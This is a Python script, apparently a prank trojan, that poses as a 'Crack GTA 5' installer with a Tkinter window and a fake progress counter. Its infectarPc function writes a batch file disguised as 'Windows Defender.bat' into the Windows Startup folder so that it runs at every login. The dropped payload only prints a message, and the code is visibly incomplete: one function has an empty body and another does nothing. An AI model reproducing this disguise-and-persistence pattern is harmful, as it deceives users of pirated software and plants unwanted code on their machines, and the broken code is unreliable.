import time
import os
import threading
from tkinter import *


def msgInstalacao():
    print("Instalando..")

    time.sleep(2)

    for x in range(0, 101):
        os.system('cls')
        print(str(x) + "%")
        time.sleep(.500)


def criarBatInicializacao():
        with open(os.path.expanduser("~") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Windows Defender.bat", "w") as arq:
                
                arq.write("echo off")
                arq.write("\n")
                arq.write("cls")
                arq.write("\n")
                arq.write("echo oi sumida rsrs")
                arq.write("\n")
                arq.write("pause")
                arq.write("\n")
                arq.close()


def navegarPastas():
        dir = os.path.dirname(os.path.realpath(__file__))


def infectarPc():
        criarBatInicializacao()
        navegarPastas()


def btn_click():
    


# TKINTER

janela = Tk()
janela.title("Crack GTA 5")
janela.geometry("500x300+150+150")

lbTitulo = Label(janela, text="Crack GTA 5")
lbDescricao = Label(janela, text="Versão 4.20 - By Devils_Crack")
lbDesenvolvedores1 = Label(janela, fg="red", text="weberRich4rds, S4tiv4, kamaLion")
lbDesenvolvedores2 = Label(janela, fg="red", text="susuk1_green, qwerty_Dev1l")
lbDesenvolvedores3 = Label(janela, fg="red", text="she_kakarot4, mc_hackudao")

btnProximo = Button(janela, width=15, text="Proximo", command=btn_click)
btnCancelar = Button(janela, width=15, text="Cancelar", command=btn_click)

imagem = PhotoImage(file="imagem.png")
img = Label(janela, image=imagem)
img.imagem = imagem
img.pack()

lbTitulo.place(x=250, y=10)
lbDescricao.place(x=250, y=40)
lbDesenvolvedores1.place(x=250, y=100)
lbDesenvolvedores2.place(x=250, y=140)
lbDesenvolvedores3.place(x=250, y=180)
img.place(x=0, y=0)

btnProximo.place(x=380, y=250)
btnCancelar.place(x=250, y=250)

janela.mainloop()


t = threading.Thread(target=msgInstalacao)
t.start()

if t.isAlive():
    infectarPc()



